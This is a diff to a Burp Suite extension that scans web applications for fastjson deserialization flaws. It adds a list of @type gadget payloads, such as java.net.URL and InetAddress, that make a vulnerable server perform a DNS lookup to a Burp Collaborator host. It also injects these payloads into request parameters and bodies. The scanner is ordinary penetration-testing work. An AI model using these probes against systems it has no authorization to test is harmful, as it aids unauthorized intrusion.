@@ -14,8 +14,8 @@ from javax.swing import JTable;
 from javax.swing import SwingUtilities;
 from javax.swing.table import AbstractTableModel;
 from threading import Lock
-import json
-import time
+import json,string
+import time,random
 
 class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController, AbstractTableModel):
     
@@ -23,7 +23,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
     # implement IBurpExtender
     #
     
-    def	registerExtenderCallbacks(self, callbacks):
+    def registerExtenderCallbacks(self, callbacks):
         # keep a reference to our callbacks object
         self._callbacks = callbacks
         
@@ -32,6 +32,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
         
         # set our extension name
         callbacks.setExtensionName("fastjson scanner")
+        print("Name:\tfastjson scanner\nAuthor:\tp1g3 && change by saline\ntime:\t2020/07/05\nversion:\t1.01")
         
         # create the log and a lock on which to synchronize when adding log entries
         self._log = ArrayList()
@@ -52,6 +53,17 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
         tabs.addTab("Request", self._requestViewer.getComponent())
         tabs.addTab("Response", self._responseViewer.getComponent())
         self._splitpane.setRightComponent(tabs)
+        self.payloads = [
+            """{"rand":{"@type":"java.net.InetAddress","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.Inet4Address","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.Inet6Address","val":"dnslog"}}""",
+            """{"rand":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}""",
+            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}}""",
+            """{"rand":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}""",
+            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}""",
+            """{"rand":Set[{"@type":"java.net.URL","val":"http://dnslog"}""",
+            """{"rand":{"@type":"java.net.URL","val":"http://dnslog"}:0""",
+        ]
         
         # customize our UI components
         callbacks.customizeUiComponent(self._splitpane)
@@ -74,6 +86,9 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
     def getTabCaption(self):
         return "FastjsonScanner"
 
+    def rand_str(self,count):
+        return ''.join(random.choice(string.letters + string.digits) for i in range(count))
+
     def getUiComponent(self):
         return self._splitpane
 
@@ -82,25 +97,25 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
 
     def doPassiveScan(self,baseRequestResponse):
         self.baseRequestResponse = baseRequestResponse
-        # service = baseRequestResponse.getHttpService()
-        result = self.scancheck(baseRequestResponse)
-        if result != [] and result !='' and result != None:
-            param,url = result
-            self.id +=1
-            #analyze_request = self._helpers.analyzeRequest(service,baseRequestResponse.getRequest())
-            self._lock.acquire()
-            row = self._log.size()
-            self._log.add(LogEntry(self.id,baseRequestResponse,param,url))
-            self.fireTableRowsInserted(row, row)
-            self._lock.release()
+        for payload in self.payloads:
+            # service = baseRequestResponse.getHttpService()
+            result = self.scancheck(baseRequestResponse,payload)
+            if result != [] and result !='' and result != None:
+                info,analyze_againRes,param,url = result
+                self.id +=1
+                #analyze_request = self._helpers.analyzeRequest(service,baseRequestResponse.getRequest())
+                self._lock.acquire()
+                row = self._log.size()
+                self._log.add(LogEntry(self.id,info,baseRequestResponse,param,url))
+                self.fireTableRowsInserted(row, row)
+                self._lock.release()
         return
 
-    def scancheck(self,baseRequestResponse):
+    def scancheck(self,baseRequestResponse,payload):
         collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
         val = collaboratorContext.generatePayload(True)
-        #print(val)
-        fastjson_poc = '{{"@type":"java.net.URL","val":"http://%s"}:"x"}' % val
-        # print(fastjson_poc)
+        payload = payload.replace('dnslog',val)
+        fastjson_poc = payload.replace('rand',self.rand_str(6))
         host, port, protocol, method, headers, params, url, reqBodys, analyze_request = self.Get_RequestInfo(baseRequestResponse)
         if method == "GET":
             is_json = False
@@ -119,17 +134,18 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                             json_list.append(key)
                     except Exception as e:
                         # print(e)
-    					pass
+                        pass
                 try:
                     replace_params += key + '=' + value + '&'
                 except:
                     pass
             replace_params = replace_params[:-1]
-            # print(replace_params)
-            # print(str_params)
             if is_json == True:
+                info = ""
                 againReq_headers = headers
                 againReq_headers[0] = headers[0].replace(params,replace_params)
+                for i in range(0,len(againReq_headers)):
+                    info = info + againReq_headers[i] + '\n'
                 againReq =  self._helpers.buildHttpMessage(againReq_headers,reqBodys)
                 if protocol == 'https':
                     is_https = True
@@ -137,18 +153,36 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     is_https = False
                 againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                 analyze_againRes = self._helpers.analyzeResponse(againRes)
-                time.sleep(10) # check time for delay
+                time.sleep(10)
                 if collaboratorContext.fetchCollaboratorInteractionsFor(val):
-                    print('success send in get.')
-                    return ','.join(json_list),str(url)
-                # print(1)
-                # while True:
-                #     # print(1)
-                #     print(collaboratorContext.fetchCollaboratorInteractionsFor(val))
-                #     if collaboratorContext.fetchCollaboratorInteractionsFor(val):
-                #         print('success')
+                    print("change params success")
+                    print(info)
+                    return info,analyze_againRes,','.join(json_list),str(url)
+            else:
+                info = ""
+                againReq_headers = headers
+                againReq_headers[0] = headers[0].replace('GET','POST')
+                againReq_headers.add('Content-Type: application/json')
+                for i in range(0,len(againReq_headers)):
+                    info = info + againReq_headers[i] + '\n'
+                againReq = self._helpers.buildHttpMessage(againReq_headers, fastjson_poc)
+                if protocol == 'https':
+                    is_https = True
+                else:
+                    is_https = False
+                againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
+                analyze_againRes = self._helpers.analyzeResponse(againRes)
+                if collaboratorContext.fetchCollaboratorInteractionsFor(val):
+                    info = info +'\n' + fastjson_poc
+                    print("change method success")
+                    print(info)
+                    return info,analyze_againRes,'againReq', str(url)
+
         elif method == "POST":
             json_list = []
+            info = ""
+            for i in range(0,len(headers)):
+                info = info + headers[i] + '\n'
             try: # check reqbody like {"xxx":"xxx"}
                 if json.loads(reqBodys) and '{' in reqBodys:
                     body_json = True
@@ -156,6 +190,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
             except:
                 #replace_reqBodys = reqBodys
                 body_json = False
+
             if body_json == True:
                 againReq = self._helpers.buildHttpMessage(headers, replace_reqBodys)
                 if protocol == 'https':
@@ -164,24 +199,17 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     is_https = False
                 againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
                 analyze_againRes = self._helpers.analyzeResponse(againRes)
-                # print(replace_reqBodys)
-                print('success')
                 time.sleep(10)
                 if collaboratorContext.fetchCollaboratorInteractionsFor(val):
-                    #print('success')
-                    return 'postdata', str(url)
-                else:
-                    print('no fetch result.')
-                # else:
-                #     print(replace_reqBodys)
-                #     print('fail')
+                    info = info +'\n' + replace_reqBodys
+                    print("change postdata success")
+                    print(info)
+                    return info,analyze_againRes,'postdata', str(url)
             else: # check reqbody like a=1&b=json_str
                 replace_params = ''
                 is_json_post = False
                 split_body_param = reqBodys.split('&')
                 for body_param in split_body_param:
-                    # print(body_param)
-                    # print(reqBodys)
                     if '=' in body_param and len(body_param.split('=')) == 2:
                         post_key, post_value = body_param.split('=')
                         urldecode_value = self._helpers.urlDecode(post_value)
@@ -200,9 +228,7 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                         # print(e)
                         pass
                 replace_params = replace_params[:-1]
-                # print(replace_params)
                 if is_json_post == True:
-                    print('success send in post get')
                     againReq = self._helpers.buildHttpMessage(headers, replace_params)
                     if protocol == 'https':
                         is_https = True
@@ -213,58 +239,11 @@ class BurpExtender(IBurpExtender, ITab, IScannerCheck, IMessageEditorController,
                     analyze_againRes = self._helpers.analyzeResponse(againRes)
                     time.sleep(10)
                     if collaboratorContext.fetchCollaboratorInteractionsFor(val):
-                        # print('success')
-                        return ','.join(json_list), str(url)
-                    # else:
-                    #     print('fail')
-            #     print(123123)
-            # print(123)
-            # str_params = str(params)
-            # split_params = str_params.split('&')
-            # replace_params = ''
-            # json_list = []
-            # for param in split_params:
-            #     if '=' in param and len(param.split('=')) == 2:
-            #         key, value = param.split('=')
-            #         urldecode_value = self._helpers.urlDecode(value)
-            #         try:
-            #             if json.loads(urldecode_value) and '{' in urldecode_value:
-            #                 value = fastjson_poc
-            #                 is_json = True
-            #                 json_list.append(key)
-            #         except Exception as e:
-            #             # print(e)
-            #             pass
-            #     try:
-            #         replace_params += key + '=' + value + '&'
-            #     except:
-            #         pass
-            #     replace_params = replace_params[:-1]
-            #     print(replace_params)
-            #     print('ok')
-            #     if is_json == True:
-            #         print('post json find')
-            #         print(replace_params)
-            #         againReq_headers = headers
-            #         againReq_headers[0] = headers[0].replace(params, replace_params)
-            #         againReq = self._helpers.buildHttpMessage(againReq_headers, reqBodys)
-            #         if protocol == 'https':
-            #             is_https = True
-            #         else:
-            #             is_https = False
-            #         againRes = self._callbacks.makeHttpRequest(host, port, is_https, againReq)
-            #         analyze_againRes = self._helpers.analyzeResponse(againRes)
-            #         time.sleep(5)  # check time for delay
-            #         if collaboratorContext.fetchCollaboratorInteractionsFor(val):
-            #             # print('success')
-            #             return ','.join(json_list), str(url)
-
-                #     print('success')
-                #     print(replace_params)
-                # else:
-                #     print(replace_params)
+                        info = info +'\n' + replace_params
+                        print("change postdata params success")
+                        print(info)
+                        return info,analyze_againRes,','.join(json_list), str(url)
         return []
-        #pass
 
 
     def Get_RequestInfo(self,baseRequestResponse):
@@ -354,10 +333,9 @@ class Table(JTable):
     
         # show the log entry for the selected row
         logEntry = self._extender._log.get(row)
-        self._extender._requestViewer.setMessage(logEntry._requestResponse.getRequest(), True)
+        self._extender._requestViewer.setMessage(logEntry.info, True)
         self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
         self._extender._currentlyDisplayedItem = logEntry._requestResponse
-        
         JTable.changeSelection(self, row, col, toggle, extend)
     
 #
@@ -365,8 +343,9 @@ class Table(JTable):
 #
 
 class LogEntry:
-    def __init__(self,record_id,requestResponse, param, url):
+    def __init__(self,record_id,info,requestResponse, param, url):
         self._id = record_id
         self._param = param
+        self.info = info
         self._requestResponse = requestResponse
         self._url = url
